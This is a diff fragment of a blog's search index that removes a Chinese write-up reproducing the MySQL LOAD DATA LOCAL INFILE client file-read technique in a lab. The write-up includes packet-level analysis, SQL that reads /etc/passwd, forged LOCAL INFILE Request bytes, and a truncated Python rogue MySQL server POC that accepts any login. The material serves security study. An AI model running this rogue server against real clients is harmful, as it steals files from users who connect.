+<p><a href="https://drun1baby.github.io/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#toc-heading-14">芜风师傅</a><a href="https://drun1baby.github.io/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#toc-heading-14">https://drun1baby.github.io/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#toc-heading-14</a>)</p>
 ]]></content>
       <categories>
         <category>JAVA安全</category>
@@ -9504,213 +9461,6 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
       </categories>
       <tags>
         <tag>JAVA反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mysql LOAD DATA 读取客户端任意文件</title>
-    <url>/2023/01/10/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/index.html</url>
-    <content><![CDATA[<!--toc-->
-
-<p>复现 Mysql LOAD DATA INFILE 读取客户端任意文件漏洞</p>
-<span id="more"></span>
-
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MySQL 客户端和服务端通信过程中是通过对话的形式来实现的，客户端发送一个操作请求，然后服务端根据客户端发送的请求来响应客户端，在这个过程中客户端如果一个操作需要两步才能完成，那么当它发送完第一个请求过后并不会存储这个请求，而是直接丢弃，所以第二步就是根据服务端的响应来继续进行，这里服务端就可以欺骗客户端做一些事情。</p>
-<p>但是一般的通信都是客户端发送一个 MySQL 语句然后服务器端根据这条语句查询后返回结果，也没什么可以利用的。但是 MySQL 有个语法 <a href="https://dev.mysql.com/doc/refman/8.0/en/load-data.html">LOAD DATA INFILE</a> 可以用来读取一个文件的内容并插入到表中。</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110095201653.png" alt="image-20230110095201653"></p>
-<p>从上图的官方文档说明可以看到，该命令既可以读取服务端的文件，也可以读取客户端的文件，这取决于 <code>LOCAL</code> modifier 是否给定。</p>
-<p>读取服务端上的文件内容存入表中的 SQL 语句是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">load data infile &quot;/etc/passwd&quot; into table TestTable fields terminated by &#x27;分隔符&#x27;;<br></code></pre></td></tr></table></figure>
-
-<p>读取客户端上的文件内容存入表中的 SQL 语句是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">load data local infile &quot;/etc/passwd&quot; into table TestTable fields terminated by &#x27;分隔符&#x27;;<br></code></pre></td></tr></table></figure>
-
-<p>两相对比，读取客户端上的文件内容多了一个 <code>local</code> 关键字。</p>
-<p>以上所描述的过程可以形象地用两个人的对话来表示：</p>
-<ol>
-<li>客户端：把我本地 &#x2F;data&#x2F;test.csv 的内容插入到 TestTable 表中去</li>
-<li>服务端：请把你本地 &#x2F;data&#x2F;test.csv 的内容发送给我</li>
-<li>客户端：好的，这是我本地 &#x2F;data&#x2F;test.cvs 的内容</li>
-<li>服务端：成功&#x2F;失败</li>
-</ol>
-<p>正常情况下这个流程没有问题，但是前文提到了客户端在第二次并不知道它自己前面发送了什么给服务器，所以客户端第二次要发送什么文件完全取决于服务端，如果这个服务端不正常，就有可能发生如下对话：</p>
-<ol>
-<li>客户端：请把我本地 &#x2F;data&#x2F;test.csv 的内容插入到 TestTable 表中去</li>
-<li>服务器：请把你本地 &#x2F;etc&#x2F;passwd 的内容发送给我</li>
-<li>客户端：好的，这是我本地 &#x2F;etc&#x2F;passwd 的内容</li>
-<li>服务端：成功偷取文件内容</li>
-</ol>
-<p>这样服务端就非法拿到了 <code>/etc/passwd</code> 的文件内容！接下来开始进行这个实验，做一个恶意服务端来欺骗客户端。为了编写出伪造恶意 MySQL 服务器的 POC，必须对 MySQL 协议有足够的了解，所以接下来尝试分析一下 MySQL 协议的数据包。</p>
-<h3 id="mysql-协议数据包分析"><a href="#MySQL-协议数据包分析" class="headerlink" title="MySQL 协议数据包分析"></a>MySQL 协议数据包分析</h3><p>为了非法读取客户端文件，我们需要实现一个假的 MySQL 服务器。那如何实现呢？这需要我们对 MySQL 协议展开详细的分析才能做到，好在借助 Wireshark 结合 MySQL 官方文档可以帮助我们轻松分析 MySQL 协议的数据包。</p>
-<p>我以 ubuntu 虚拟机为客户端，windows物理机为服务端，借助 Wireshark 工具捕捉两者间的 mysql 通信数据包。</p>
-<p>客户端ip：192.168.239.129</p>
-<p>服务端ip：192.168.1.3</p>
-<p>客户端和服务端之间交互的 MySQL命令如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">mysql -h 192.168.1.3 -P 3306 -u root -p<br>use security;<br>load data local infile &quot;/etc/passwd&quot; into table users;<br></code></pre></td></tr></table></figure>
-
-<p>开启物理机的 mysql，这里注意需要设置 mysql 允许外来连接，不知道如何操作看看这篇文章</p>
-<p><a href="https://blog.csdn.net/qq_18948359/article/details/102500590">设置 MySQL 允许外部访问</a></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110110906097.png" alt="image-20230110110906097"></p>
-<p>2.打开 wireshark，选择捕获 Vmware 相关的网卡并选择过滤 MySQL 协议，然后用虚拟机连接。</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110122939199.png" alt="image-20230110122939199"></p>
-<blockquote>
-<p>注意：不要使用 mysql 8.0.12 版本，否则相关的数据包显示不完整，甚至连接的用户名都显示不了，这个版本的加密可能更严格吧。</p>
-</blockquote>
-<p>官方文档告诉我们 MySQL 协议也支持通过 TLS 进行加密和身份验证。<a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_basic_tls.html">MYSQL_TLS</a></p>
-<p>那我们捕获的数据包是否进行了加密呢？稍加分析一下这些捕获的数据包就可以判断其确实使用了 TLS 进行了加密。接下来我们根据文档结合 Wireshark 捕获的数据包来进行实践论证！</p>
-<h4 id="连接过程数据包"><a href="#连接过程数据包" class="headerlink" title="连接过程数据包"></a>连接过程数据包</h4><p>运行连接命令时捕获到的数据包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">mysql -h 192.168.1.3 -P 3306 -u root -p<br></code></pre></td></tr></table></figure>
-
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110183743582.png" alt="image-20230110183743582"></p>
-<p>不打算全部都细说，就以前两个数据包为例子，和官方文档对照来学习其结构。</p>
-<ul>
-<li><h6 id="第一个数据包-protocolhandshakev10-服务端到客户端"><a href="#第一个数据包-Protocol-HandshakeV10-服务端到客户端" class="headerlink" title="第一个数据包 Protocol::HandshakeV10 服务端到客户端"></a>第一个数据包 Protocol::HandshakeV10 服务端到客户端</h6></li>
-</ul>
-<p>当客户端通过 MySQL 协议连接到 服务端会发生什么呢？官方文档 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_packets_protocol_handshake.html">Protocol::Handshake </a>告诉我们当客户端连接到服务端时，服务端会发送一个初始的握手数据包（Initial Handshake Packet）给客户端。根据服务端的版本和配置选项，服务端会发送不同的初始数据包。</p>
-<p>为了服务端可以支持新的协议，Initial Handshake Packet 初始的握手数据包的第一个字节被定义为协议的版本号。从 MySQL 3.21.0 版本开始，发送的是 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_packets_protocol_handshake_v10.html">Protocol::HandshakeV10</a></p>
-<p>我采用的 MySQL 版本是 5.7.26，所以发送的就是 <code>Protocol::HandShakeV10</code> ，我们可以看看文档是如何定义这个数据包的结构的：</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110140208673.png" alt="image-20230110140208673"></p>
-<p>关于 <code>Type</code> 字段各个值的含义在 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_basic_dt_integers.html#a_protocol_type_int1">Integer Types</a> 和 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_basic_dt_strings.html#sect_protocol_basic_dt_string_null">String Types</a></p>
-<p><code>int&lt;1&gt;</code> 就是 一个字节，<code>string&lt;NUL&gt;</code> 表示以 00 字节结尾的字符串。</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110140708117.png" alt="image-20230110140708117"></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110140729506.png" alt="image-20230110140729506"></p>
-<p>我们点开 Wireshark 中服务端给客户端发送的初始数据包，从 <code>Server Greeting</code> 字段开始就是 payload 部分，也就是初始的握手数据包。从图中我们可以看到有协议版本、服务端的 MySQL 版本、进程 ID。这和我们上图的文档是不是完美对应上了？</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110141433465.png" alt="image-20230110141433465"></p>
-<p>Protocol::HandShakeV10 只定义了一个数据包的 payload 部分，而关于头部的定义在 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_basic_packets.html">MySQL Packets</a></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110150942509.png" alt="image-20230110150942509"></p>
-<p>和实际的数据包的对应：</p>
-<p>payload_length:</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110151005836.png" alt="image-20230110151005836"></p>
-<p>sequence_id:</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110151024733.png" alt="image-20230110151024733"></p>
-<p>payload:</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110151214416.png" alt="image-20230110151214416"></p>
-<p>值得注意的是 Wireshark 的数据是按照小端排列的，比如数据包长度 74 对应的字段数据是 <code>4a 00 00</code>。</p>
-<p>其余的字段就不再分析了，大同小异。紧接着简单看看客户端给服务端的回应吧。官方文档告诉我们，如果客户端支持 SSL(<a href="https://dev.mysql.com/doc/dev/mysql-server/latest/group__group__cs__capabilities__flags.html">Capabilities Flags</a> &amp; CLIENT_SSL is on and the <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/mysql_8h.html#ae246c1906ffb10491c3876ce39bb1d7b">mysql_ssl_mode</a> of the client is not SSL_MODE_DISABLED) ，那么一个短的被称为 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_packets_protocol_ssl_request.html">Protocol::SSLRequest:</a> 的数据包会被发送，使得服务端建立一个 SSL layer 并等待来自客户端的下一个数据包。（这里你可能会感到混乱，前面不是说 TLS 吗，怎么现在变成了 SSL？其实 TLS 是升级版的 SSL，但是由于 SSL 这一术语更加常用，所以人们经常互换使用者两个术语。<a href="https://www.websecurity.digicert.com/zh/cn/security-topics/what-is-ssl-tls-https">什么是 SSL、TLS、HTTPS</a>）</p>
-<p>如果不支持，那么客户端会返回 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_packets_protocol_handshake_response.html">Protocol::HandshakeResponse:</a> 。同时在任何时候，发生任何错误，客户端都会断开连接。</p>
-<ul>
-<li><h6 id="第二个数据包-protocolhandshakeresponse41-客户端到服务端"><a href="#第二个数据包-Protocol-HandshakeResponse41-客户端到服务端" class="headerlink" title="第二个数据包 Protocol::HandshakeResponse41 客户端到服务端"></a>第二个数据包 Protocol::HandshakeResponse41 客户端到服务端</h6></li>
-</ul>
-<p>根据前面的分析，这里客户端如果支持 SSL，那么会发送 <code>Protocol::SSLRequest</code> 数据包，否则就是<code>Protocol::HandshakeResponse:</code>。根据我的验证，应该发送的是 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_packets_protocol_handshake_response.html#sect_protocol_connection_phase_packets_protocol_handshake_response41">Protocol::HandshakeResponse41</a></p>
-<blockquote>
-<p>感觉挺奇怪的，我觉得应该发送 SSLRequest 才是，但是其包结构却又对应不上。</p>
-</blockquote>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110155957039.png" alt="image-20230110155957039"></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110160009859.png" alt="image-20230110160009859"></p>
-<p>client_flag（4字节），包括了扩展的 Client capabilities</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110154523933.png" alt="image-20230110154523933"></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110154532699.png" alt="image-20230110154532699"></p>
-<p>max_packet_size（4字节）</p>
-<p>0x01000000 &#x3D; 16777216</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110154621557.png" alt="image-20230110154621557"></p>
-<p>character_set（1字节）</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110160051396.png" alt="image-20230110160051396"></p>
-<p>filler（23字节）</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110160132308.png" alt="image-20230110160132308"></p>
-<p>username（以 00 结尾的字符串）</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110160203395.png" alt="image-20230110160203395"></p>
-<p>auth_response</p>
-<p>文档中说这是一个条件选项，当前的数据包是满足这个条件的。</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110161053756.png" alt="image-20230110161053756"></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110161038844.png" alt="image-20230110161038844"></p>
-<p>根据文档对这个字段的释义，其是一个不透明的验证响应。没想到在实际数据包中是一个密码，经过了某个哈希算法。我没有去求证 MySQL 采用什么哈希算法，</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110161236039.png" alt="image-20230110161236039"></p>
-<p>接下来就不继续分析，大同小异。</p>
-<p>这个数据包的重点在于能够表明客户端是否支持 <code>LOAD DATA LOCAL</code>，这是我们可以读取客户端本地文件的根本。关于这个字段的定义在：<a href="https://dev.mysql.com/doc/dev/mysql-server/latest/group__group__cs__capabilities__flags.html#ga06acc4847890b7ef14a8e7c0782a679c">CLIENT_LOCAL_FILES</a></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110152116352.png" alt="image-20230110152116352"></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110152515536.png" alt="image-20230110152515536"></p>
-<ul>
-<li><h6 id="第三个数据包-ok_packet-服务端到客户端"><a href="#第三个数据包-Ok-Packet-服务端到客户端" class="headerlink" title="第三个数据包 Ok_Packet 服务端到客户端"></a>第三个数据包 Ok_Packet 服务端到客户端</h6></li>
-</ul>
-<p>这个数据包一看就是 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_basic_ok_packet.html">Ok_Packet</a></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110174934214.png" alt="image-20230110174934214"></p>
-<ul>
-<li><h6 id="第四个数据包-com_query-客户端到服务端"><a href="#第四个数据包-COM-QUERY-客户端到服务端" class="headerlink" title="第四个数据包 COM_QUERY 客户端到服务端"></a>第四个数据包 COM_QUERY 客户端到服务端</h6></li>
-</ul>
-<p>这个数据包是 <a href>COM_QUERY</a></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110175643451.png" alt="image-20230110175643451"></p>
-<ul>
-<li><h6 id="第五个数据包-text-resultset-服务端到客户端"><a href="#第五个数据包-Text-Resultset-服务端到客户端" class="headerlink" title="第五个数据包 Text Resultset 服务端到客户端"></a>第五个数据包 Text Resultset 服务端到客户端</h6></li>
-</ul>
-<p>这个数据包是 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_com_query_response_text_resultset.html">Text Resultset</a></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110180602484.png" alt="image-20230110180602484"></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110180306697.png" alt="image-20230110180306697"></p>
-<h4 id="选择-security-数据库捕获的数据包"><a href="#选择-security-数据库捕获的数据包" class="headerlink" title="选择 security 数据库捕获的数据包"></a>选择 security 数据库捕获的数据包</h4><p>当客户端向服务端发送 <code>use security</code> 命令选择数据库时捕获到的数据包。特别多，下图并没有截完整。这一步不重要</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110184931513.png" alt="image-20230110184931513"></p>
-<h4 id="读取客户端文件捕获的数据包"><a href="#读取客户端文件捕获的数据包" class="headerlink" title="读取客户端文件捕获的数据包"></a>读取客户端文件捕获的数据包</h4><p>在客户端上执行如下命令将 <code>/etc/passwd</code> 文件内容写入到 users 表时捕获到的数据包。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">load data local infile &quot;/etc/passwd&quot; into table users;<br></code></pre></td></tr></table></figure>
-
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110185609391.png" alt="image-20230110185609391"></p>
-<p>一共就四个包，很明显第一个包是一个 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_com_query.html">COM_QUERY</a></p>
-<blockquote>
-<p>这个图我不小心去读服务端的文件了，但是无伤大雅。数据包结构是一样的，而且下图我重抓啦~</p>
-</blockquote>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110185803281.png" alt="image-20230110185803281"></p>
-<p>糟糕的是第三个数据包由于我的物理机拒绝了访问而导致这个数据包是一个错误响应数据包。</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110185130329.png" alt="image-20230110185130329"></p>
-<p>我在这里找到了解决方案</p>
-<p><a href="https://stackoverflow.com/questions/63361962/error-2068-hy000-load-data-local-infile-file-request-rejected-due-to-restrict">stackoverflow</a></p>
-<p>连接的时候用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">mysql --local-infile=1 -u root -p -h 192.168.1.3<br></code></pre></td></tr></table></figure>
-
-<p>重新抓一遍包！！</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110193600096.png" alt="image-20230110193600096"></p>
-<ul>
-<li><h6 id="第一个数据包-客户端到服务端-com_query"><a href="#第一个数据包-客户端到服务端-COM-QUERY" class="headerlink" title="第一个数据包 客户端到服务端 COM_QUERY"></a>第一个数据包 客户端到服务端 COM_QUERY</h6></li>
-</ul>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110195556005.png" alt="image-20230110195556005"></p>
-<ul>
-<li><h6 id="第二个数据包-服务端到客户端-local-infile-request"><a href="#第二个数据包-服务端到客户端-LOCAL-INFILE-Request" class="headerlink" title="第二个数据包 服务端到客户端 LOCAL INFILE Request"></a>第二个数据包 服务端到客户端 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_com_query_response_local_infile_request.html">LOCAL INFILE Request</a></h6></li>
-</ul>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110195626110.png" alt="image-20230110195626110"></p>
-<p>这个数据包很重要，是构造恶意 MySQL 服务器的重点，我们需要根据这个数据包的结构书写 payload。具体地说，需要伪造的部分是 MySQL 数据包的首部和 payload 部分。还记得前面的 MySQL 数据包的结构图吗？</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230111105201596.png" alt="image-20230111105201596"></p>
-<p>对照一下上图就会发现这个 MySQL 协议数据包的头部是</p>
-<p><code>0c 00 00 01</code></p>
-<p>对应的 payload（不是 wireshark 的那个 Payload） 是</p>
-<p><code>fb 2f 65 74 63 2f 70 61 73 73 77 64</code></p>
-<ul>
-<li><h6 id="第三个数据包-客户端到服务端-com_query"><a href="#第三个数据包-客户端到服务端-COM-QUERY" class="headerlink" title="第三个数据包 客户端到服务端 COM_QUERY"></a>第三个数据包 客户端到服务端 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_com_query.html">COM_QUERY</a></h6></li>
-</ul>
-<p>上一个数据包服务端给客户端发送<code>LOAL INFILE Request</code> 的响应后，客户端发给服务端的这一个数据就包含了 <code>/etc/passwd</code> 文件的内容。</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110200915868.png" alt="image-20230110200915868"></p>
-<ul>
-<li><h6 id="第四个数据包-服务端到客户端-ok_packet"><a href="#第四个数据包-服务端到客户端-Ok-Packet" class="headerlink" title="第四个数据包 服务端到客户端 Ok_Packet"></a>第四个数据包 服务端到客户端 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_basic_ok_packet.html">Ok_Packet</a></h6></li>
-</ul>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110201644039.png" alt="image-20230110201644039"></p>
-<p>客户端经过两个请求，成功的将自己的 <code>/etc/passwd</code> 文件插入到表 users 中，</p>
-<p>根据我们前面所说，客户端在发送完第一个请求之后并不会存储这个请求，而是直接丢弃。所以第二步是根据服务端的响应来进行，这里服务器就可以欺骗客户端做一些事情（改变第二个数据包的响应内容）。有了以上的铺垫，POC 的编写并不困难。只需要完成连接过程，然后修改第二个数据包的响应内容就好。</p>
-<h4 id="poc"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>我懒得完整编写 POC 了，所以从网上抄了一个。值得一提的是这个 POC 并不标准，在连接建立过程中发送的数据并没有包含数据包首部，而发送 payload 的时候又包含了首部。（同时从编写的代码来看好像编写者并没有对数据包的构成有一个准确的认识 hhh，当然也有可能是我错了）</p>
-<ol>
-<li><code>客户端发送请求数据包</code></li>
-<li><code>服务端发送 Mysql 的 Greet 与 banner 信息</code></li>
-<li><code>客户端发送认证请求(用户名与密码)</code></li>
-<li><code>这里面我们当然要保证无论输入什么密码都是可以的</code></li>
-<li>获取到文件信息直接输出</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding: utf8</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-comment"># linux :</span><br><span class="hljs-comment">#filestring = &quot;/etc/passwd&quot;</span><br><span class="hljs-comment"># windows:</span><br><span class="hljs-comment">#filestring = &quot;C:\Windows\system32\drivers\etc\hosts&quot;</span><br>HOST = <span class="hljs-string">&quot;0.0.0.0&quot;</span> <span class="hljs-comment"># open for eeeeveryone! ^_^</span><br>PORT = <span class="hljs-number">3306</span><br>BUFFER_SIZE = <span class="hljs-number">1024</span><br><span class="hljs-comment">#1 Greeting</span><br>greeting = <span class="hljs-string">&quot;\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span><br><span class="hljs-comment">#2 Accept all authentications</span><br>authok = <span class="hljs-string">&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span><br><span class="hljs-comment">#3 Payload</span><br><span class="hljs-comment">#数据包长度</span><br>payloadlen = <span class="hljs-string">&quot;\x0c&quot;</span> <span class="hljs-comment">#这里明显有问题啦，因为文档告诉我们数据包的长度是用三个字节表示的</span><br>padding = <span class="hljs-string">&quot;\x00\x00&quot;</span><br>payload = payloadlen + padding +  <span class="hljs-string">&quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span> <span class="hljs-comment">#这里又把序列号拼在了 数据包的 payload部分</span><br>s = socket.socket(socket.AF_INET, 